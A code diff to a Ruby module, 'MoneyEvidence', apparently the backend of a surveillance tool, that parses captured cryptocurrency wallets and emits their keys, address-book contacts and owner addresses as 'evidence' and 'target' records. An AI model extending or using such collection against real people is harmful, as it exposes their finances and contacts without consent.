@@ -71,24 +71,55 @@ module MoneyEvidence
     temp = RCS::DB::Config.instance.temp(SecureRandom.base64(10))
     File.open(temp, 'wb') {|d| d.write binary_wallet}
 
+    coin = info[:data][:currency]
     # all the parsing is done here
-    cw = CoinWallet.new(temp, info[:data][:currency])
+    cw = CoinWallet.new(temp, coin)
 
     # remove temporary
     FileUtils.rm_rf temp
 
     trace :debug, "WALLET: #{info[:data][:currency]} #{cw.version} #{cw.encrypted?} #{cw.balance}"
 
-    info[:data][:kind] = :wallet
+    info[:data][:type] = :wallet
     info[:data][:version] = cw.version
     info[:data][:encrypted] = cw.encrypted?
     info[:data][:balance] = cw.balance
+    info[:data][:content] = ''
+    cw.keys.each do |k|
+      info[:data][:content] += "Name: #{k[:name]}\n Key: #{k[:address]}\n\n"
+    end
 
     # output the first evidence that contains the whole wallet
     yield info if block_given?
+
+    # output the addressbook entries
+    address_info = Hash[common_info]
+    address_info[:type] = :addressbook
+
+    cw.addressbook.each do |k|
+      trace :debug, "WALLET: address #{k.inspect}"
+      info = Hash[address_info]
+      info[:data] = {}
+      info[:data][:program] = coin
+      info[:data][:name] = k[:name]
+      info[:data][:handle] = k[:address]
+      yield info if block_given?
+    end
+
+    cw.keys.each do |k|
+      trace :debug, "WALLET: key #{k.inspect}"
+      info = Hash[address_info]
+      info[:data] = {}
+      info[:data][:program] = coin
+      info[:data][:type] = :target
+      info[:data][:name] = k[:name]
+      info[:data][:handle] = k[:address]
+      yield info if block_given?
+    end
+
+    # output the transactions
+
     :delete_raw
-
-
   end
 end
 
